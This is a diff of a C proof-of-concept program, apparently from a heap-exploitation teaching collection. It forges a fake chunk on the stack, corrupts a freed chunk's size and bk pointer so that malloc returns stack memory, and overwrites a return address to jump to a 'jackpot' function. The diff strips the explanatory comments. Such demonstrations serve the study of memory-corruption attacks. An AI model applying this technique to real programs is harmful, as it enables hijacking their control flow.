@@ -39,41 +39,26 @@ void jackpot(){ printf("Nice jump d00d\n"); exit(0); }
 int main() {
 	intptr_t stack_buffer[4] = {0};
 
-	printf("Allocating the victim chunk\n");
 	intptr_t* victim = malloc(0x100);
+	malloc(0x100); // barrier
 
-	printf("Allocating another chunk to avoid consolidation with top chunk\n");
-	intptr_t* p1 = malloc(0x100);
-
-	printf("Freeing the victim chunk, it will be inserted in the unsorted bin\n");
 	free(victim);
 
-	printf("Create a fake chunk on the stack\n");
-	// Set size for next allocation (0x100 request -> 0x110 chunk size)
+	// Forge fake chunk on stack
 	stack_buffer[1] = 0x100 + 0x10;
-	// Set bk to a writable address (doesn't matter much for this simple PoC)
 	stack_buffer[3] = (intptr_t)stack_buffer;
 
-	//------------VULNERABILITY-----------
-	printf("Now emulating a vulnerability that can overwrite victim->size and victim->bk\n");
-
-	// We set size to a small value (32) so that a malloc(0x100)
-	// won't be satisfied by this chunk directly.
+	// VULNERABILITY: Corrupt unsorted bin size and bk
 	victim[-1] = 32;
-
-	// Set bk to our fake stack chunk
 	victim[1] = (intptr_t)stack_buffer;
-	//------------------------------------
 
-	printf("Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
 	char *p2 = malloc(0x100);
-	printf("malloc(0x100): %p\n", p2);
 
 	intptr_t sc = (intptr_t)jackpot;
-	// Overwrite return address on stack (offset depends on environment)
 	memcpy((p2+40), &sc, 8);
 
 	assert((long)__builtin_return_address(0) == (long)jackpot);
+	return 0;
 }
 ```
 
